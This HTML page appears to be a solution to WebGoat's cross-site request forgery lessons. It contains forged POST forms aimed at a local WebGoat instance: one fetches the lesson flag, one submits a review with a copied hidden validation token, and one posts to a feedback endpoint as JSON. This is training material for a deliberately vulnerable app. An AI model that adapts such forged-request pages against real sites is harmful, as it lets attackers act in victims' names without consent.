<!doctype html>
<html lang="en" xmlns="http://www.w3.org/1999/html">
<head>
    <meta charset="UTF-8">
    <meta name="viewport"
          content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>CSRF Sample Page</title>
</head>
<body>

<h1>Getting the flag</h1>
<form action="http://localhost:8080/WebGoat/csrf/basic-get-flag" method="POST">
    <input type="submit">
</form>


<h1>Sending a review</h1>
<form action="http://localhost:8080/WebGoat/csrf/review" method="POST">
    <input class="form-control" id="reviewText" name="reviewText" placeholder="Add a Review" type="text">
    <input class="form-control" id="reviewStars" name="stars" type="text">
    <input type="hidden" name="validateReq" value="2aa14227b9a13d0bede0388a7fba9aa9">
    <input type="submit" name="submit" value="Submit review">
</form>


<h1>Content type</h1>
<form class="attack-form" accept-charset="UNKNOWN" id="csrf-feedback" method="POST" preparedata="feedback" action="http://localhost:8080/WebGoat/csrf/feedback/message" contenttype="application/json">
    <div class="row">
        <div class="col-md-6">
            <div class="form-group">
                <label for="name">
                    Name</label>
                <input type="text" class="form-control" name="name" id="name" placeholder="Enter name" required="required" data-com.bitwarden.browser.user-edited="yes">
            </div>
            <div class="form-group">
                <label for="email">
                    Email Address</label>
                <div class="input-group">
                                <span class="input-group-addon"><span class="glyphicon glyphicon-envelope"></span>
                                </span>
                    <input type="email" name="email" class="form-control" id="email" placeholder="Enter email" required="required" data-com.bitwarden.browser.user-edited="yes"></div>
            </div>
<!--            <div class="form-group">-->
<!--                <label for="subject">-->
<!--                    Subject</label>-->
<!--                <select id="subject" name="subject" class="form-control" required="required">-->
<!--                    <option value="na" selected="">Choose One:</option>-->
<!--                    <option value="service">General Customer Service</option>-->
<!--                    <option value="suggestions">Suggestions</option>-->
<!--                    <option value="product">Product Support</option>-->
<!--                </select>-->
<!--            </div>-->
        </div>
        <div class="col-md-6">
            <div class="form-group">
                <label for="name">
                    Message</label>
                <textarea name="message" id="message" class="form-control" rows="9" cols="25" required="required" placeholder="Message"></textarea>
            </div>
        </div>
        <div class="col-md-12">
            <button class="btn btn-primary pull-right" id="btnContactUs">
                Send Message
            </button>
        </div>
    </div>
</form>
</body>
</html>
